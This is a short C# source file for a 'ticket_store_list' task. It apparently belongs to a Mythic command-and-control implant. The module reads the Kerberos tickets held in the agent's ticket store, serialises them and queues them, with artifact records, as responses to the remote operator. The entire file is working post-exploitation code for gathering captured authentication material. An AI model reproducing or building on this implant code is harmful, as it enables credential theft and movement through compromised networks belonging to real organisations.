﻿#define COMMAND_NAME_UPPER

#if DEBUG
#define TICKET_STORE_LIST
#endif

#if TICKET_STORE_LIST

using System;
using System.Collections.Generic;
using System.Text;
using SystemAgentInterop.Classes;
using SystemAgentInterop.Interfaces;
using SystemAgentInterop.Structs.MythicStructs;
using SystemAgentInterop.Utils;

namespace Tasks;

public class ticket_store_list : Tasking
{

    public ticket_store_list(IAgent agent, MythicTask data) : base(agent, data)
    { }
    public override void Start()
    {
        MythicTaskResponse resp = new MythicTaskResponse { };
        try
        {
           var storedTickets =   _agent.GetTicketManager().GetTicketsFromTicketStore();
            resp = CreateTaskResponse(_jsonSerializer.Serialize(storedTickets), true);
            
        }
        catch (Exception ex)
        {
           resp = CreateTaskResponse($"Error in {this.GetType().Name} - {ex.Message}", true, "error");
            
        }
        //get and send back any artifacts
        IEnumerable<Artifact> artifacts = _agent.GetTicketManager().GetArtifacts();
        var artifactResp = CreateArtifactTaskResponse(artifacts);
        _agent.GetTaskManager().AddTaskResponseToQueue(artifactResp);

        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
    }
}
#endif